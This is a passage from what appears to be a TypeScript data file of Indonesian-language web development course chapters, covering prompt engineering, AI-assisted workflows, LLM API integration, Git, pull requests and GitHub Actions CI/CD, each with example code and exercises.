AI\\n3. @-reference file atau fungsi untuk konteks yang lebih baik\\n4. Break down task — minta AI kerjakan satu hal pada satu waktu\\n5.\n\nSelalu test kode yang dihasilkan AI",

    codeExample: { language: "markdown", code: "# Cursor Cmd+K Workflow\n\n## 1. Pilih kode yang mau diubah\n## 2. Tekan Cmd+K (atau Ctrl+K)\n## 3. Tulis instruksi:\n    \"Refactor ini jadi menggunakan early return pattern\n     dan tambahkan type annotations untuk parameters\"\n\n## 4. AI akan menunjukkan diff — review perubahan\n## 5. Accept (Cmd+Enter) atau Reject (Escape)\n\n# Cursor Chat Workflow\n\n## 1. Buka chat panel (Cmd+L)\n## 2. Tanya dengan konteks:\n    \"@UserService Apa bug potensial di service ini?\"\n## 3. AI akan analisis dan berikan jawaban\n## 4. Follow-up dengan perbaikan:\n    \"Fix bug nomor 2 dan generate unit test-nya\"\n\n# Copilot Inline Workflow\n\n## 1. Tulis komentar deskriptif:\n    // Fungsi untuk validasi email dengan regex RFC 5322\n## 2. Copilot akan suggest implementasi\n## 3. Tekan Tab untuk menerima\n## 4. Review dan sesuaikan" },

    explainAlong: "Cursor menggunakan @ untuk referensi file/fungsi — konteks yang lebih baik. Copilot menggunakan context dari file yang terbuka.",

    aiPrompt: "Install Cursor atau Copilot di editor-mu. Coba generate 3 fungsi berbeda dan review kualitas hasilnya.",

    reflection: "AI editor bisa 10x productivity — tapi juga bisa 10x bug kalau tidak di-review. Selalu baca kode yang dihasilkan.",

  },

  {

    id: "20.3",

    moduleId: 20,

    chapterNum: "20.3",

    title: "Prompt Engineering untuk Developer",

    subtitle: "Tulis prompt yang efektif untuk mendapatkan kode berkualitas tinggi",

    level: "Menengah",

    objectives: [

      "Bisa menulis prompt yang efektif",

      "Mengerti struktur prompt yang baik",

      "Menguasai teknik context dan chaining",

    ],

    analogy: { diagram: "Prompt Structure:\n1. Role: 'You are a senior React developer'\n2. Context: 'We use Vite, TypeScript, Tailwind'\n3. Task: 'Create a reusable Button component'\n4. Requirements: 'Must support variants, sizes, loading state'\n5. Output format: 'Provide code + brief explanation'", caption: "Prompt engineering adalah skill menulis instruksi yang jelas untuk AI — semakin spesifik, semakin baik hasilnya" },

    explanation: "Prompt engineering bukan tentang 'engineering' dalam arti teknis — ini adalah skill komunikasi. Kemampuan kamu untuk menjelaskan apa yang kamu inginkan dengan jelas dan kontekstual akan menentukan kualitas output AI.\\n\\n**Struktur Prompt yang Efektif**\\nPrompt yang baik mengikuti struktur: Role + Context + Task + Requirements + Output Format.\\n\\n**1. Role — Berikan AI sebuah peran**\\n\\\"You are an expert TypeScript developer with 10 years of experience building scalable web applications.\\\"\\n\\nIni mengatur 'persona' AI dan mempengaruhi depth dan style jawabannya.\\n\\n**2. Context — Berikan konteks proyek**\\n\\\"We are building a task management app using React 19, Vite, TypeScript, Tailwind CSS, and shadcn/ui.\n\nThe backend uses Hono with Drizzle ORM.\\\"\\n\\nKonteks membantu AI memahami ecosystem dan constraint yang berlaku.\\n\\n**3.\n\nTask — Jelaskan apa yang perlu dikerjakan**\\n\\\"Create a task list component that displays tasks with filtering and sorting capabilities.\\\"\\n\\nTask harus spesifik dan actionable.\\n\\n**4.\n\nRequirements — Detail spesifikasi**\\n\\\"Requirements:\\n- Filter by status (all, active,\n\nCompleted)\\n- Sort by date or priority\\n- Pagination with 10 items per page\\n- Empty state when no tasks\\n- Loading skeleton while fetching\\n- Error handling with retry button\\\"\\n\\nRequirements yang jelas mengurangi iterasi dan revisi.\\n\\n**5.\n\nOutput Format — Tentukan format output**\\n\\\"Please provide:\\n1.\n\nThe component code\\n2. A brief explanation of the approach\\n3. Any potential improvements or edge cases\\\"\\n\\n**Teknik Lanjut**\\n\\n**Chain of Thought**: Minta AI berpikir step-by-step\\n\\\"Think through this step by step before writing any code.\\\"\\n\\n**Few-Shot Prompting**: Berikan contoh input/output yang diinginkan\\n\\\"Here are examples of the API response format we expect: [examples]\\\"\\n\\n**Iterative Refinement**: Refine output bertahap\\n\\\"Good start. Now add error handling and TypeScript strict types.\\\"",

    codeExample: { language: "markdown", code: "# Contoh: Prompt untuk Generate API Endpoint\n\n## Prompt:\nYou are a senior backend developer specializing in TypeScript and Hono.\n\nContext:\n- We use Bun runtime with Hono framework\n- Database: SQLite with Drizzle ORM\n- Authentication: JWT middleware already implemented\n\nTask:\nCreate a REST API endpoint for managing user preferences.\n\nRequirements:\n- GET /api/preferences — return current user preferences\n- PATCH /api/preferences — update specific fields\n- Validation with Zod schema\n- Type-safe Drizzle queries\n- Handle edge cases (first-time user, invalid data)\n- Include error responses with proper HTTP status codes\n\nOutput:\n1. Complete route handler code\n2. Zod schema definition\n3. Drizzle schema update if needed\n4. Brief explanation of the approach\n\n---\n\n# Contoh: Prompt untuk Refactor\n\n## Prompt:\nRefactor the following code to use early return pattern,\nadd proper TypeScript types, and follow clean code principles:\n\n[PASTE CODE HERE]\n\nExplain what you changed and why." },

    explainAlong: "5 komponen prompt (Role, Context, Task, Requirements, Output) = hasil yang konsisten dan berkualitas.",

    aiPrompt: "Tulis prompt untuk generate fitur lengkap (CRUD + search + pagination) untuk entity 'Project'. Gunakan struktur 5 komponen.",

    reflection: "Simpan prompt-prompt yang berhasil ke dalam library pribadi. Prompt yang reusable akan menghemat waktu signifikan.",

  },

  {

    id: "20.4",

    moduleId: 20,

    chapterNum: "20.4",

    title: "AI-Powered Development Workflow",

    subtitle: "Integrasikan AI ke seluruh workflow development dari planning sampai deployment",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa menggunakan AI untuk planning dan architecture",

      "Mengerti AI-assisted debugging",

      "Mengerti batasan AI dan kapan tidak menggunakannya",

    ],

    analogy: { diagram: "Development Workflow:\nPlanning → Architecture → Coding → Review → Debug → Deploy\n    ↓           ↓           ↓         ↓        ↓       ↓\n   AI          AI          AI        AI       AI      AI", caption: "AI bisa membantu di setiap fase development — tapi dengan cara dan batasan yang berbeda" },

    explanation: "AI tidak hanya untuk coding — AI bisa membantu di seluruh software development lifecycle.\n\nMari eksplor bagaimana AI bisa membantu di setiap fase.\\n\\n**1.\n\nPlanning dengan AI**\\nGunakan AI untuk membantu merencanakan fitur:\\n- Break down user stories menjadi tugas teknis\\n- Estimasi kompleksitas\\n- Identifikasi dependensi dan risk\\n- Generate acceptance criteria\\n\\nPrompt contoh:\\n\\\"Break down this user story into technical tasks: 'As a user,\n\nI want to filter tasks by priority and due date so I can focus on what matters most.' Include frontend, backend, and database tasks.\\\"\\n\\n**2.\n\nArchitecture dengan AI**\\nAI bisa membantu merancang arsitektur:\\n- Generate database schema dari requirement\\n- Suggest API endpoint structure\\n- Evaluate trade-offs antara approaches\\n- Generate diagram/dokumentasi\\n\\nTapi hati-hati: AI tidak tahu constraint spesifik organisasimu (budget, team size, existing tech stack).\n\nSelalu validasi dengan engineering judgment.\\n\\n**3.\n\nCoding dengan AI**\\nIni adalah use case paling umum yang sudah kita bahas.\n\nKey points:\\n- Generate boilerplate dan scaffolding\\n- Implement business logic\\n- Write tests\\n- Add documentation\\n\\n**4.\n\nCode Review dengan AI**\\nGunakan AI sebagai reviewer kedua:\\n- Identifikasi potensial bug atau edge cases\\n- Suggest improvement untuk readability\\n- Check security vulnerability umum\\n- Verify test coverage\\n\\nPrompt: \\\"Review this code for: potential bugs,\n\nSecurity issues, performance concerns, and TypeScript best practices. [PASTE CODE]\\\"\\n\\n**5.\n\nDebugging dengan AI**\\nAI sangat membantu untuk debugging:\\n- Paste error message, dapatkan analisis\\n- Explain stack trace yang kompleks\\n- Suggest fix untuk race condition\\n- Identify memory leak patterns\\n\\n**6. Deployment dengan AI**\\n- Generate CI/CD configuration\\n- Troubleshoot deployment issues\\n- Optimize Docker images\\n- Write infrastructure as code\\n\\n**Kapan TIDAK Menggunakan AI**\\n1. **Security-sensitive code**: Jangan paste kode ke public AI\\n2. **Novel problems**: AI bagus untuk pattern umum, bukan masalah unik\\n3.\n\n**When learning fundamentals**: Jangan pakai AI saat belajar konsep dasar — otakmu perlu latihan\\n4. **When judgment is needed**: Keputusan arsitektur, trade-off, ethical considerations",

    codeExample: { language: "markdown", code: "# AI Debugging Workflow\n\n## 1. Dapatkan error message lengkap\n## 2. Copy relevant code context\n## 3. Prompt AI:\n    \"I'm getting this error: [ERROR MESSAGE]\n     \n     Here's the code: [CODE]\n     \n     And here's the context:\n     - I'm using Bun + Hono + Drizzle ORM\n     - This happens when calling POST /api/users\n     - The database connection works for other endpoints\n     \n     What could be causing this and how do I fix it?\"\n\n## 4. AI akan analisis dan berikan:\n    - Penjelasan penyebab error\n    - Suggested fix\n    - Prevention tips\n\n## 5. Validasi fix sebelum apply:\n    - Apakah fix ini masuk akal?\n    - Apakah ada side effects?\n    - Apakah ini best practice?\n\n# AI Architecture Review\n\n## Prompt:\n    \"I'm designing a real-time notification system for a SaaS app.\n     Current constraints:\n     - 10,000 concurrent users\n     - Need real-time updates (WebSocket)\n     - Must support push notifications\n     - Budget: minimal infrastructure cost\n     \n     I'm considering these approaches:\n     1. WebSocket server (Socket.io)\n     2. Server-Sent Events (SSE)\n     3. Polling with Redis pub/sub\n     \n     Evaluate each approach with pros/cons for my constraints.\"" },

    explainAlong: "Debugging dengan AI lebih efektif kalau kamu provide konteks yang lengkap: error message, kode, dan environment.",

    aiPrompt: "Gunakan AI untuk debug satu bug yang sedang kamu hadapi. Bandingkan waktu debugging dengan dan tanpa AI.",

    reflection: "AI adalah alat, bukan oracle. Keputusan final tetap ada di tangan developer. Jangan outsource thinking ke AI.",

  },

  {

    id: "20.5",

    moduleId: 20,

    chapterNum: "20.5",

    title: "Membangun Aplikasi dengan AI Integration",

    subtitle: "Integrasikan LLM API ke dalam aplikasi yang kamu bangun",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa menggunakan OpenAI/Claude API",

      "Mengerti streaming response",

      "Bisa membuat chat interface di aplikasi",

    ],

    analogy: { diagram: "AI Integration:\nFrontend (Chat UI) → Backend (API route) → LLM API (OpenAI/Claude) → Stream response → Frontend", caption: "Integrasi LLM ke aplikasi membuka kemungkinan fitur AI-powered: chatbot, content generation, smart search" },

    explanation: "Setelah belajar menggunakan AI sebagai developer tool, saatnya belajar membangun aplikasi yang mengintegrasikan AI untuk end-user. Ini adalah skill yang sangat valuable di pasar kerja saat ini.\\n\\n**Arsitektur AI Integration**\\n```\\nUser → Frontend (Chat UI)\\n         ↓\\n       Backend (Hono API)\\n         ↓\\n       LLM API (OpenAI/Claude)\\n         ↓\\n       Stream Response → User\\n```\\n\\nKenapa perlu backend?\\n1. **API key security**: API key LLM tidak boleh di-expose ke frontend\\n2. **Rate limiting**: Hindari abuse dan kontrol cost\\n3.\n\n**Prompt engineering**: Kontrol prompt di server\\n4.\n\n**Logging**: Track usage dan debug\\n\\n**OpenAI API Basics**\\n```typescript\\nimport OpenAI from 'openai';\\nconst openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });\\n\\nconst completion = await openai.chat.completions.create({\\n  model: 'gpt-4o-mini',\\n  messages: [{\\n    role: 'user',\\n    content: 'Jelaskan konsep closure dalam JavaScript dengan analogi sederhana',\\n  }],\\n});\\nconsole.log(completion.choices[0].message.content);\\n```\\n\\n**Streaming Response**\\nUntuk UX yang lebih baik,\n\nGunakan streaming — response dikirim piece by piece:\\n\\n```typescript\\nconst stream = await openai.chat.completions.create({\\n  model: 'gpt-4o-mini',\\n  messages: [{ role: 'user', content: prompt }],\\n  stream: true,  // Enable streaming\\n});\\n\\nfor await (const chunk of stream) {\\n  const text = chunk.choices[0]?.delta?.content ??\n\n'';\\n  // Kirim ke client via WebSocket/SSE\\n}\\n```\\n\\n**Model Selection**\\n- **gpt-4o**: Model terbaik untuk task kompleks\\n- **gpt-4o-mini**: Murah, cepat,\n\nBagus untuk task sederhana\\n- **claude-3.5-sonnet**: Alternatif excellent dari Anthropic\\n- **claude-3-haiku**: Cepat dan murah untuk task ringan\\n\\n**System Prompt**\\nGunakan system prompt untuk mengontrol behavior AI:\\n\\n```typescript\\nconst messages = [\\n  {\\n    role: 'system',\\n    content: 'You are a helpful coding assistant.\n\nExplain concepts simply with examples.\n\nAlways provide TypeScript code.',\\n  },\\n  { role: 'user', content: userQuestion },\\n];\\n```",

    codeExample: { language: "typescript", code: "// Backend: Hono route untuk AI chat\nimport { Hono } from 'hono';\nimport OpenAI from 'openai';\n\nconst app = new Hono();\nconst openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });\n\napp.post('/api/chat', async (c) => {\n  const { message } = await c.req.json();\n  \n  // Rate limiting check\n  const userId = c.get('userId');\n  const usage = await checkUsage(userId);\n  if (usage >= 100) return c.json({ error: 'Rate limit exceeded' }, 429);\n  \n  const completion = await openai.chat.completions.create({\n    model: 'gpt-4o-mini',\n    messages: [\n      {\n        role: 'system',\n        content: 'You are a web development tutor. Explain concepts clearly with code examples. Use Indonesian language.',\n      },\n      { role: 'user', content: message },\n    ],\n    max_tokens: 1000,\n  });\n  \n  const reply = completion.choices[0].message.content;\n  await logUsage(userId, message.length, reply?.length ?? 0);\n  \n  return c.json({ reply });\n});\n\n// Frontend: React component\nfunction ChatInterface() {\n  const [messages, setMessages] = useState<{role: string; content: string}[]>([]);\n  const [input, setInput] = useState('');\n  const [loading, setLoading] = useState(false);\n  \n  const sendMessage = async () => {\n    if (!input.trim()) return;\n    setLoading(true);\n    \n    const userMsg = { role: 'user', content: input };\n    setMessages(prev => [...prev, userMsg]);\n    setInput('');\n    \n    const res = await fetch('/api/chat', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ message: input }),\n    });\n    const data = await res.json();\n    setMessages(prev => [...prev, { role: 'assistant', content: data.reply }]);\n    setLoading(false);\n  };\n  \n  return (\n    <div>\n      {messages.map((m, i) => (\n        <div key={i} className={m.role === 'user' ? 'user-msg' : 'ai-msg'}>\n          {m.content}\n        </div>\n      ))}\n      {loading && <div>AI sedang mengetik...</div>}\n      <input value={input} onChange={e => setInput(e.target.value)}\n        onKeyDown={e => e.key === 'Enter' && sendMessage()} />\n      <button onClick={sendMessage}>Kirim</button>\n    </div>\n  );\n}" },

    explainAlong: "System prompt mengontrol personality dan constraint AI. Rate limiting di backend mencegah abuse dan kontrol cost. max_tokens membatasi panjang response.",

    aiPrompt: "Tambahkan fitur streaming ke chat interface-mu. Gunakan Server-Sent Events (SSE) untuk kirim response piece by piece.",

    reflection: "Integrasi AI ke aplikasi adalah competitive advantage. Tapi ingat: cost LLM bisa besar untuk skala tinggi — selalu implementasikan rate limiting dan caching.",

  },

];



// ============================================================

// MODUL 21: GIT & TEAM WORKFLOW (5 chapters)

// ============================================================



const modul21: Chapter[] = [

  {

    id: "21.1",

    moduleId: 21,

    chapterNum: "21.1",

    title: "Git: Version Control untuk Developer",

    subtitle: "Pahami version control dan workflow dasar Git",

    level: "Pemula-Menengah",

    objectives: [

      "Memahami konsep version control",

      "Bisa menggunakan Git dasar (init, add, commit, push)",

      "Mengerti branching dan merging",

    ],

    analogy: { diagram: "Git Workflow:\nWorking Directory → git add → Staging Area → git commit → Repository → git push → Remote", caption: "Git menyimpan history perubahan kode — memungkinkan kolaborasi, eksperimen, dan recovery dari kesalahan" },

    explanation: "Bayangkan kamu menulis novel. Setiap bab yang selesai, kamu simpan sebagai draft terpisah. Kalau kamu merasa bab 5 kurang bagus, kamu bisa kembali ke draft sebelumnya. Git melakukan hal yang sama untuk kode — menyimpan snapshot setiap perubahan sehingga kamu bisa kembali ke versi sebelumnya kapan saja.\\n\\n**Apa Itu Git?**\\nGit adalah distributed version control system.\n\nSetiap developer punya salinan lengkap repository di local machine-nya. Tidak perlu koneksi internet untuk bekerja — commit, branch, merge semua berjalan locally.\\n\\n**Kenapa Git Penting?**\\n1. **History**: Lihat siapa yang mengubah apa dan kapan\\n2. **Collaboration**: Banyak developer kerja di kode yang sama tanpa konflik\\n3.\n\n**Experimentation**: Buat branch untuk eksperimen tanpa merusak kode utama\\n4. **Recovery**: Kembali ke versi sebelumnya kalau ada masalah\\n5. **Backup**: Remote repository (GitHub/GitLab) sebagai backup\\n\\n**Workflow Dasar**\\n\\n    git init                    # Inisialisasi repository\\n    git add nama-file.ts        # Stage perubahan\\n    git add .                   # Stage semua perubahan\\n    git commit -m \\\"pesan\\\"      # Simpan perubahan ke repository\\n    git push origin main        # Kirim ke remote repository\\n    git pull origin main        # Ambil perubahan terbaru\\n\\n**Konsep Penting: Staging Area**\\nGit punya 3 area:\\n1. **Working Directory**: File yang sedang kamu edit\\n2.\n\n**Staging Area**: File yang sudah siap di-commit (git add)\\n3. **Repository**: History commit yang tersimpan\\n\\nAnaloginya seperti packing untuk pindahan. Working directory = barang yang masih berserakan. Staging area = barang yang sudah masuk ke kardus siap diangkut.\n\nRepository = barang yang sudah sampai di rumah baru.\\n\\n**Branching: Jalur Parallel**\\nBranch memungkinkan kamu mengerjakan fitur baru tanpa mengganggu kode utama:\\n\\n    git branch fitur-baru       # Buat branch baru\\n    git checkout fitur-baru     # Pindah ke branch\\n    # atau dalam satu command:\\n    git checkout -b fitur-baru\\n\\n    # Kerjakan fitur,\n\nCommit, lalu merge ke main:\\n    git checkout main\\n    git merge fitur-baru\\n\\n**Merging: Menggabungkan Branch**\\nKalau tidak ada konflik, merge berjalan otomatis.\n\nTapi kalau file yang sama diubah di kedua branch, Git akan minta kamu resolve konflik secara manual.",

    codeExample: { language: "bash", code: "# Setup repository baru\ngit init proyek-saya\ncd proyek-saya\n\n# Konfigurasi\ngit config user.name \"Nama Kamu\"\ngit config user.email \"kamu@email.com\"\n\n# Workflow sehari-hari\necho \"# Proyek Saya\" > README.md\ngit add README.md\ngit commit -m \"Initial commit: tambah README\"\n\n# Buat branch untuk fitur\ngit checkout -b fitur-navbar\n\n# Edit file, lalu commit\necho \"/* navbar styles */\" > navbar.css\ngit add .\ngit commit -m \"Tambah navbar dengan responsive design\"\n\n# Kembali ke main dan merge\ngit checkout main\ngit merge fitur-navbar\n\n# Push ke remote\ngit remote add origin https://github.com/username/proyek.git\ngit push -u origin main" },

    explainAlong: "git checkout -b = buat branch + pindah sekaligus. -u flag pada push mengatur upstream tracking.",

    aiPrompt: "Buat repository Git untuk proyek-mu. Lakukan minimal 5 commit dengan pesan yang deskriptif. Buat 2 branch dan merge salah satunya.",

    reflection: "Commit sering dan kecil (atomic commit). Jangan commit sekaligus 500 baris perubahan — sulit di-review dan di-rollback kalau ada masalah.",

  },

  {

    id: "21.2",

    moduleId: 21,

    chapterNum: "21.2",

    title: "Git Lanjutan: Rebase, Stash, dan Reset",

    subtitle: "Kuasai teknik Git advanced untuk workflow yang lebih bersih",

    level: "Menengah",

    objectives: [

      "Bisa menggunakan rebase untuk history bersih",

      "Mengerti stash untuk menyimpan sementara",

      "Mengerti perbedaan reset, revert, dan checkout",

    ],

    analogy: { diagram: "Git Advanced:\n├── rebase: Pindah commit ke base baru (history linear)\n├── stash: Simpan perubahan sementara\n├── cherry-pick: Ambil commit tertentu\n├── reset: Undo commit\n└── revert: Buat commit yang membatalkan commit sebelumnya", caption: "Rebase membuat history linear dan bersih — lebih mudah dibaca dan di-debug" },

    explanation: "Setelah menguasai dasar Git, saatnya belajar teknik yang membuat workflow lebih powerful dan history lebih bersih.\\n\\n**Rebase vs Merge**\\nKeduanya menggabungkan branch,\n\nTapi dengan cara berbeda:\\n\\n**Merge**: Membuat commit merge baru yang menggabungkan dua branch.\n\nHistory menunjukkan branch yang sebenarnya terjadi.\\n\\n**Rebase**: Memindahkan commit dari branch ke ujung branch target.\n\nHistory menjadi linear seolah-olah kerjaan dilakukan secara sequential.\\n\\nKapan pakai mana:\\n- **Merge**: Untuk feature branch yang akan di-merge ke main (history menunjukkan kapan fitur di-merge)\\n- **Rebase**: Untuk update branch dengan perubahan terbaru dari main (history bersih, tidak ada commit merge)\\n\\n    git checkout fitur-saya\\n    git rebase main    # Pindah commit fitur-saya ke atas main terbaru\\n\\n**Interactive Rebase**\\nRebase dengan kontrol penuh — edit, hapus,\n\nAtau gabungkan commit:\\n\\n    git rebase -i HEAD~5   # Operasi pada 5 commit terakhir\\n\\nMenu yang tersedia:\\n- **pick**: Gunakan commit apa adanya\\n- **reword**: Ubah commit message\\n- **squash**: Gabungkan commit dengan commit sebelumnya\\n- **drop**: Hapus commit\\n- **edit**: Hentikan untuk mengubah commit\\n\\n**Stash: Simpan Sementara**\\nSimpan perubahan yang belum di-commit untuk dikerjakan nanti:\\n\\n    git stash                 # Simpan perubahan\\n    git stash list            # Lihat daftar stash\\n    git stash pop             # Ambil stash terakhir dan hapus\\n    git stash apply           # Ambil stash terakhir, tapi jangan hapus\\n    git stash drop            # Hapus stash terakhir\\n\\n**Reset vs Revert vs Checkout**\\n\\n**git reset**: Memindahkan HEAD ke commit tertentu.\n\nBisa menghapus commit history.\\n\\n    git reset --soft HEAD~1   # Hapus commit terakhir, tapi simpan perubahan di staging\\n    git reset --mixed HEAD~1  # Hapus commit terakhir,\n\nPerubahan di working directory\\n    git reset --hard HEAD~1   # Hapus commit + perubahan (hati-hati!)\\n\\n**git revert**: Membuat commit baru yang membatalkan commit sebelumnya.\n\nHistory tetap utuh.\\n\\n    git revert abc1234        # Buat commit yang undo perubahan abc1234\\n\\n**Rule of thumb**: Kalau commit sudah di-push ke shared repository, gunakan revert. Kalau masih di local, gunakan reset.",

    codeExample: { language: "bash", code: "# Workflow: Update feature branch dengan main terbaru\ngit checkout main\ngit pull origin main          # Ambil update terbaru\ngit checkout fitur-navbar\ngit rebase main               # Rebase fitur ke main terbaru\n# Kalau ada konflik, resolve, lalu:\ngit add .\ngit rebase --continue\n\n# Bersihkan history sebelum PR\ngit rebase -i HEAD~5\n# Ganti 'pick' jadi 'squash' untuk commit yang related\n# Tulis commit message yang bagus\n\n# Push setelah rebase (force push karena history berubah)\ngit push --force-with-lease origin fitur-navbar\n\n# Stash workflow\ngit stash push -m \"WIP: navbar responsive\"\ngit checkout hotfix-bug\n# Kerjakan hotfix...\ngit checkout fitur-navbar\ngit stash pop" },

    explainAlong: "--force-with-lease lebih aman dari --force — hanya push kalau tidak ada commit baru di remote. rebase -i untuk squash commit WIP ('work in progress') jadi satu commit yang bersih.",

    aiPrompt: "Praktikkan interactive rebase: buat 5 commit di branch, lalu squash jadi 2 commit dengan pesan yang deskriptif.",

    reflection: "History yang bersih bukan cuma estetika — memudahkan code review, debugging dengan git bisect, dan rollbacks.",

  },

  {

    id: "21.3",

    moduleId: 21,

    chapterNum: "21.3",

    title: "GitHub: Kolaborasi dan Pull Request",

    subtitle: "Workflow kolaboratif menggunakan GitHub dan Pull Request",

    level: "Menengah",

    objectives: [

      "Bisa membuat dan mengelola Pull Request",

      "Mengerti code review workflow",

      "Mengerti GitHub Actions dasar",

    ],

    analogy: { diagram: "GitHub Workflow:\n1. Fork/Clone → 2. Branch → 3. Commit → 4. Push → 5. Pull Request → 6. Review → 7. Merge", caption: "Pull Request adalah mekanisme review kode sebelum merge — kunci untuk kolaborasi berkualitas" },

    explanation: "Git adalah version control system. GitHub adalah platform hosting untuk repository Git yang menambahkan fitur kolaborasi. Untuk bekerja dalam tim, kamu perlu menguasai workflow kolaboratif di GitHub.\\n\\n**Pull Request (PR) Workflow**\\nPull Request adalah permintaan untuk menggabungkan perubahan dari branch ke branch lain (biasanya ke main). PR memungkinkan:\\n1.\n\n**Code review**: Tim member review perubahan sebelum di-merge\\n2.\n\n**Discussion**: Diskusi tentang implementasi di thread\\n3.\n\n**CI/CD integration**: Automated test berjalan sebelum merge\\n4.\n\n**Approval gate**: Merge hanya bisa dilakukan setelah approved\\n\\n**Langkah-langkah PR:**\\n\\n    1. git checkout -b fitur-xyz          # Buat branch\\n    2. # Kerjakan fitur, commit\\n    3. git push origin fitur-xyz          # Push branch ke remote\\n    4. # Buat PR di GitHub UI\\n    5. # Reviewer review dan approve\\n    6. # Merge PR (squash/rebase/merge commit)\\n\\n**Branching Strategy**\\n\\n**Git Flow** (traditional):\\n- main: Production code\\n- develop: Development branch\\n- feature/*: Feature branches\\n- release/*: Release preparation\\n- hotfix/*: Urgent production fixes\\n\\n**Trunk-Based Development** (modern):\\n- main: Single branch,\n\nSelalu deployable\\n- feature branches: Pendek (1-2 hari), sering merge\\n\\n**GitHub Flow** (simple):\\n- main: Deployable\\n- Semua kerjaan di branch, PR ke main\\n\\n**Code Review Best Practices**\\nSebagai author PR:\\n- PR kecil dan fokus (< 400 baris idealnya)\\n- Deskripsi yang jelas: apa yang diubah dan kenapa\\n- Link ke issue/ticket terkait\\n- Pastikan CI passing sebelum minta review\\n\\nSebagai reviewer:\\n- Review dalam 24 jam\\n- Fokus pada: correctness, security, performance, maintainability\\n- Gunakan suggest changes untuk edit kecil\\n- Approve dengan catatan atau request changes",

    codeExample: { language: "markdown", code: "# Pull Request Template\n\n## Deskripsi\nJelaskan apa yang diubah dan kenapa.\n\n## Perubahan\n- [ ] Fitur baru\n- [ ] Bug fix\n- [ ] Refactor\n- [ ] Documentation\n\n## Checklist\n- [ ] Test sudah ditulis dan passing\n- [ ] Tidak ada error di console\n- [ ] Code sudah di-self-review\n- [ ] PR kecil dan fokus\n\n## Screenshots (kalau UI)\n[Screenshot perubahan]\n\n## Related Issue\nCloses #123\n\n---\n\n# Code Review Checklist (untuk reviewer)\n\n## Correctness\n- [ ] Logic sesuai dengan requirement\n- [ ] Edge cases ditangani\n- [ ] Error handling adequate\n\n## Code Quality\n- [ ] Naming convention consistent\n- [ ] Tidak ada duplikasi kode\n- [ ] Function kecil dan fokus\n\n## Security\n- [ ] Tidak ada hardcoded secrets\n- [ ] Input validation\n- [ ] XSS/SQL injection protection" },

    explainAlong: "PR template memastikan setiap PR punya informasi yang cukup untuk reviewer. Code review checklist memastikan review konsisten.",

    aiPrompt: "Buat PR template di repository-mu (.github/pull_request_template.md). Submit satu PR ke proyek open source dan alami code review dari maintainer.",

    reflection: "PR yang kecil dan fokus = review lebih cepat dan lebih thorough. PR besar sering di-review dengan santai karena intimidating.",

  },

  {

    id: "21.4",

    moduleId: 21,

    chapterNum: "21.4",

    title: "GitHub Actions: CI/CD untuk Tim",

    subtitle: "Automatisasi testing, building, dan deployment dengan GitHub Actions",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa membuat GitHub Actions workflow",

      "Mengerti triggers, jobs, dan steps",

      "Bisa setup automated testing dan deployment",

    ],

    analogy: { diagram: "GitHub Actions:\n├── Trigger (on: push, PR, schedule)\n├── Job (group of steps)\n├── Step (individual command/action)\n└── Runner (execution environment)", caption: "GitHub Actions mengotomatisasi workflow development — dari test sampai deploy" },

    explanation: "Setelah menguasai Git dan Pull Request, saatnya mengotomatisasi workflow dengan GitHub Actions. CI/CD (Continuous Integration/Continuous Deployment) adalah praktik otomatisasi build, test, dan deploy setiap kali ada perubahan kode.\\n\\n**Kenapa CI/CD?**\\n1. **Konsistensi**: Setiap perubahan melewati proses yang sama\\n2. **Cepat**: Otomatisasi lebih cepat dan tidak terlupakan daripada manual\\n3.\n\n**Safety**: Test sebagai gatekeeper sebelum deploy\\n4. **Visibility**: Semua orang bisa lihat status build\\n\\n**Konsep GitHub Actions**\\n\\n**Workflow**: File YAML di `.github/workflows/` yang mendefinisikan automation.\\n\\n**Trigger**: Event yang memicu workflow:\\n- `push`: Saat ada push ke branch\\n- `pull_request`: Saat ada PR dibuat/updated\\n- `schedule`: Jadwal periodic (cron)\\n- `workflow_dispatch`: Manual trigger dari UI\\n\\n**Job**: Group dari steps yang berjalan pada satu runner. Jobs bisa parallel atau sequential (dengan `needs`).\\n\\n**Step**: Individual command atau action.\\n\\n**Runner**: Mesin virtual yang mengeksekusi workflow (Ubuntu, Windows, macOS).\\n\\n**Action**: Reusable unit of code. Bisa dari GitHub Marketplace atau buat sendiri.\\n\\n**Contoh Workflow Lengkap**\\n```yaml\\nname: CI\\n\\non:\\n  push:\\n    branches: [main]\\n  pull_request:\\n    branches: [main]\\n\\njobs:\\n  test:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      - uses: oven-sh/setup-bun@v1\\n      - run: bun install\\n      - run: bun run lint\\n      - run: bun test\\n      - run: bun run build\\n  deploy:\\n    needs: test\\n    runs-on: ubuntu-latest\\n    if: github.ref == 'refs/heads/main'\\n    steps:\\n      - uses: actions/checkout@v4\\n      - run: echo \\\"Deploying...\\\"\\n```\\n\\n**Secrets dan Environment Variables**\\nSimpan API key dan credential secara aman:\\n\\n1.\n\nBuka repository Settings → Secrets and variables → Actions\\n2. Tambahkan secret (ter-enkripsi) atau variable\\n3. Akses di workflow dengan `${{ secrets.NAMA_SECRET }}`",

    codeExample: { language: "yaml", code: "# .github/workflows/ci.yml\nname: CI/CD Pipeline\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  lint-and-test:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Bun\n        uses: oven-sh/setup-bun@v1\n        with:\n          bun-version: latest\n\n      - name: Install dependencies\n        run: bun install\n\n      - name: Run linter\n        run: bun run lint\n\n      - name: Run tests\n        run: bun test\n\n      - name: Upload coverage\n        uses: actions/upload-artifact@v4\n        with:\n          name: coverage-report\n          path: coverage/\n\n  build-and-deploy:\n    needs: lint-and-test\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - uses: actions/checkout@v4\n      - uses: oven-sh/setup-bun@v1\n\n      - name: Install and build\n        run: |\n          bun install\n          bun run build\n\n      - name: Deploy to production\n        env:\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n        run: |\n          echo \"Deploying with key $DEPLOY_KEY\"\n          # Deployment commands here" },

